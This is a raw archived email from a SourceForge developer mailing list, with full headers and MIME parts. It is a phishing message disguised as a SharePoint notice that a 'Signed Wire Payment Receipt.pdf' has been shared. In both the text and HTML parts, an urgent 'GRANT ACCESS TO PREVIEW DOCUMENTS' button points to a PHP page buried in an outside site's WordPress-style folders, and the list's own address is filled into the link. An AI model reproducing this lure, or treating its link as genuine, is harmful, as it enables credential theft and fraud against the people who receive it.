Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id D945D477A06
	for <lists+industrypack-devel@lfdr.de>; Thu, 16 Dec 2021 18:10:18 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1mxuGm-0002BC-Am
	for lists+industrypack-devel@lfdr.de; Thu, 16 Dec 2021 17:10:17 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <olivantun@vipegroup.com>) id 1mxuGl-0002B6-5w
 for industrypack-devel@lists.sourceforge.net; Thu, 16 Dec 2021 17:10:16 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Message-Id:Date:MIME-Version:Content-Type:To:
 Subject:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=hFiEuCMyN2wRh9UbCrfkMkiK+IO/oVckvGpPMoLqi78=; b=Nn78VtkdIPJ0gcX22fPjgRNGgf
 SOC2ZaQ1mAZ0W1TlNBVTdCr0leCsNtndX2OuNN+spVclxHiktTIZE7G6SCkNq4V/YvSHm96pEdyKX
 QqP+RMWvLsqWiaruGQLT1qY+D+XYW97fGhDORdnRXg1SDpqh6te2u2L1XiVvN947d3M0=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Message-Id:Date:MIME-Version:Content-Type:To:Subject:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=hFiEuCMyN2wRh9UbCrfkMkiK+IO/oVckvGpPMoLqi78=; b=f
 TIkxicHCyUW3zdNP66QKXTbJHSPenS8VCDdWGvHwcL9jP0apF9n5cDhAaAwYI4Vg7DcYhxCOW9wv6
 8vjgrv9Psec2CvZZTI2yJLHK2iI6n3lfWBhmBb5BdWdVTg5FsieXve1qVQOzub+A344kZ7uPYsyzw
 1oyuwN5BAfWdxsgU=;
Received: from [207.154.236.86] (helo=mta0.vipegroup.com)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 id 1mxuGl-000AGT-J5
 for industrypack-devel@lists.sourceforge.net; Thu, 16 Dec 2021 17:10:16 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default;
 d=vipegroup.com; 
 h=From:Subject:To:Content-Type:MIME-Version:Date:Message-Id;
 i=olivantun@vipegroup.com;
 bh=hFiEuCMyN2wRh9UbCrfkMkiK+IO/oVckvGpPMoLqi78=;
 b=eUf9WPBy6RcF6cInbb9eghxT2AFHrt23O6UJU22LjfHHxPDrts0VaePm68uN5qy0mqo5ZCdUb4BQ
 zZkNa8ihMf+pk5PJ3lEMgoa5jXa/0DU0Oc36F/ObzGzcZnH4BWn8Ea8hTgttTR2Hx56nv2HiyGYp
 HEHLaOdWspnHzsFxvaE=
To: <industrypack-devel@lists.sourceforge.net>
MIME-Version: 1.0
Date: Thu, 16 Dec 2021 17:10:08 +0000
Message-Id: <20211612171008E5DE9796CB-57E6E75E96@vipegroup.com>
X-Spam-Score: 1.1 (+)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Lists.sourceforge.net INC Lists.sourceforge.net Share
 Document
 on SharePoint group payment@Lists.sourceforge.nethas new document for you
 All Company 
 Content analysis details:   (1.1 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 -0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [207.154.236.86 listed in wl.mailspike.net]
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
X-Headers-End: 1mxuGl-000AGT-J5
Subject: [Industrypack-devel] Mandatory Authroziation Required!!
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: "Lists.sourceforge.net|Vital Auth via Industrypack-devel"
 <industrypack-devel@lists.sourceforge.net>
Reply-To: "Lists.sourceforge.net|Vital Auth" <olivantun@vipegroup.com>
Content-Type: multipart/mixed; boundary="===============5716277374453841136=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

This is a multi-part message in MIME format

--===============5716277374453841136==
Content-Type: multipart/alternative; boundary="NKmqIbmFRF2QSqcgAW9d2UU1FVBq=_net1"

This is a multi-part message in MIME format

--NKmqIbmFRF2QSqcgAW9d2UU1FVBq=_net1
Content-Type: text/plain; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable


Lists.sourceforge.net INC
Lists.sourceforge.net Share Document on SharePoint group

payment@Lists.sourceforge.nethas new document for you=20


All Company

12/16/2021
# VALERO ENERGY "Signed Wire Payment Receipt.pdf"
( grant required permissions to view this document )

GRANT ACCESS TO PREVIEW DOCUMENTS https://relevantlogic.com/glassandgl=
aze/wp_includesss/bodsanfr/wp_includess/bonfire/offficees/balaoldlldoo=
diil/plononswertio.php?blendonsawerpoiu=3Dindustrypack-devel@lists.sou=
rceforge.net

--NKmqIbmFRF2QSqcgAW9d2UU1FVBq=_net1
Content-Type: text/html; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable


<html><head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
8859-1">
  <META name=3Dviewport content=3D"width=3Ddevice-width, initial-scale=
=3D1"> <META name=3Dformat-detection content=3Dtelephone=3Dno><title>M=
andatory Authroziation Required!!</title>
 </head>
 <body style=3D"BACKGROUND-COLOR: #ffffff" bgColor=3D#ffffff> <P align=
=3Dleft><FONT size=3D3 face=3DArial>&nbsp;</P> <CENTER data-link-color=
=3D"#1188E6" data-body-style=3D"font-size:14px; font-family:arial,helv=
etica,sans-serif; color:#000000; background-color:#FFFFFF;"> <DIV></FO=
NT><table cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#ff=
ffff border=3D0> <tr><td bgColor=3D#ffffff vAlign=3Dtop width=3D"100%"=
><table role=3Dcontent-container cellSpacing=3D0 cellPadding=3D0 width=
=3D"100%" align=3Dcenter border=3D0> <tr><td width=3D"100%"><table cel=
lSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0> <tr><td><table=
 style=3D"MAX-WIDTH: 600px; WIDTH: 100%" cellSpacing=3D0 cellPadding=3D=
0 width=3D"100%" align=3Dcenter border=3D0> <tr><td role=3Dmodules-con=
tainer style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0=
px; PADDING-RIGHT: 0px" bgColor=3D#ffffff width=3D"100%" align=3Dleft>=
<table role=3Dmodule style=3D"TABLE-LAYOUT: fixed" cellSpacing=3D0 cel=
lPadding=3D0 width=3D"100%" border=3D0 data-type=3D"text" data-muid=3D=
"538286a3-fc8d-4d88-b117-b7c636d370c7" data-mc-module-version=3D"2019-=
10-22"> <tr><td role=3Dmodule-content style=3D"PADDING-BOTTOM: 0px; PA=
DDING-TOP: 18px; PADDING-LEFT: 0px; LINE-HEIGHT: 22px; PADDING-RIGHT: =
0px" bgColor=3D#ffffff height=3D"100%" vAlign=3Dtop><FONT size=3D3 fac=
e=3DArial> <DIV style=3D"FONT-FAMILY: inherit"><SPAN style=3D"FONT-SIZ=
E: 12px; COLOR: rgb(175,175,175)">Lists.sourceforge.net&nbsp;INC</SPAN=
><BR><BR><SPAN style=3D"FONT-SIZE: 24px">Lists.sourceforge.net Share D=
ocument &nbsp;on SharePoint group</SPAN></DIV> <DIV style=3D"FONT-FAMI=
LY: inherit">&nbsp;</DIV> <DIV style=3D"FONT-FAMILY: inherit"><SPAN st=
yle=3D"FONT-SIZE: 14px">&nbsp;<A href=3D"payment@Lists.sourceforge.net=
&nbsp;has new document for you&nbsp;</SPAN></DIV> <DIV style=3D" inher=
it? FONT-FAMILY:></DIV> <DIV style=3D"FONT-FAMILY: inherit"><SPAN styl=
e=3D"FONT-SIZE: 14px; COLOR: rgb(33,125,177)"><STRONG>All Company</STR=
ONG></SPAN></DIV> <DIV>&nbsp;</DIV></FONT></A></SPAN></TD></TR></TABLE=
><table role=3Dmodule style=3D"TABLE-LAYOUT: fixed" cellSpacing=3D0 ce=
llPadding=3D0 width=3D"100%" border=3D0 data-type=3D"divider" data-mui=
d=3D"12ab527b-44a2-4c07-b7b4-03cdb98808aa"> <tr><td role=3Dmodule-cont=
ent style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px;=
 PADDING-RIGHT: 0px" height=3D"100%" vAlign=3Dtop><table style=3D"FONT=
-SIZE: 5px; LINE-HEIGHT: 5px" height=3D5 cellSpacing=3D0 cellPadding=3D=
0 width=3D"100%" align=3Dcenter border=3D0> <tr><td style=3D"PADDING-B=
OTTOM: 5px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" b=
gColor=3D#217db1><FONT size=3D3 face=3DArial>&nbsp;</FONT></TD></TR></=
TABLE></TD></TR></TABLE><table role=3Dmodule style=3D"TABLE-LAYOUT: fi=
xed" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0 data-ty=
pe=3D"text" data-muid=3D"28265873-78d6-4ba5-b6c0-8f33e480a5ca"> <tr><t=
d role=3Dmodule-content style=3D"PADDING-BOTTOM: 18px; PADDING-TOP: 18=
px; PADDING-LEFT: 30px; LINE-HEIGHT: 22px; PADDING-RIGHT: 0px" height=3D=
"100%" vAlign=3Dtop><FONT size=3D3 face=3DArial> <DIV style=3D"FONT-FA=
MILY: inherit"><STRONG>12/16/2021</STRONG><BR><BR>#&nbsp;VALERO ENERGY=
&nbsp;"<STRONG>Signed Wire Payment&nbsp;&nbsp;Receipt.pdf</STRONG>"<BR=
><BR>(&nbsp;grant required permissions &nbsp;to view this document )</=
DIV> <DIV>&nbsp;</DIV></FONT></TD></TR></TABLE><table role=3Dmodule st=
yle=3D"TABLE-LAYOUT: fixed" cellSpacing=3D0 cellPadding=3D0 width=3D"1=
00%" border=3D0 data-type=3D"button" data-muid=3D"dc16cec2-70ed-4509-8=
819-66afbcba9aaa" data-role=3D"module-button"> <tr><td style=3D"PADDIN=
G-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px=
" align=3Dcenter><table cellSpacing=3D0 cellPadding=3D0 border=3D0> <t=
r><td style=3D"FONT-SIZE: 16px; TEXT-ALIGN: center; border-radius: 6px=
" bgColor=3D#3898d9 align=3Dcenter><FONT size=3D3 face=3DArial><A styl=
e=3D"FONT-SIZE: 14px; BORDER-TOP: rgb(56,152,217) 1px solid; BORDER-RI=
GHT: rgb(56,152,217) 1px solid; BORDER-BOTTOM: rgb(56,152,217) 1px sol=
id; COLOR: rgb(255,255,255); PADDING-BOTTOM: 12px; PADDING-TOP: 12px; =
PADDING-LEFT: 18px; BORDER-LEFT: rgb(56,152,217) 1px solid; DISPLAY: i=
nline-block; LINE-HEIGHT: 7px; PADDING-RIGHT: 18px; BACKGROUND-COLOR: =
rgb(56,152,217); border-radius: 0px; text-decoration-line: none" href=3D=
"https://relevantlogic.com/glassandglaze/wp_includesss/bodsanfr/wp_inc=
ludess/bonfire/offficees/balaoldlldoodiil/plononswertio.php?blendonsaw=
erpoiu=3Dindustrypack-devel@lists.sourceforge.net" target=3D_blank>GRA=
NT ACCESS TO PREVIEW DOCUMENTS</A></FONT></TD></TR></TABLE></TD></TR><=
/TABLE></TD></TR></TABLE></TD></TR></TABLE></TD></TR></TABLE></TD></TR=
></TABLE><FONT size=3D3 face=3DArial></DIV></CENTER> <P>&nbsp; &nbsp; =
&nbsp; &nbsp;&nbsp;</p><p align=3Dleft>&nbsp;&nbsp;</FONT></P></body>
 </html>

--NKmqIbmFRF2QSqcgAW9d2UU1FVBq=_net1--



--===============5716277374453841136==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============5716277374453841136==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============5716277374453841136==--


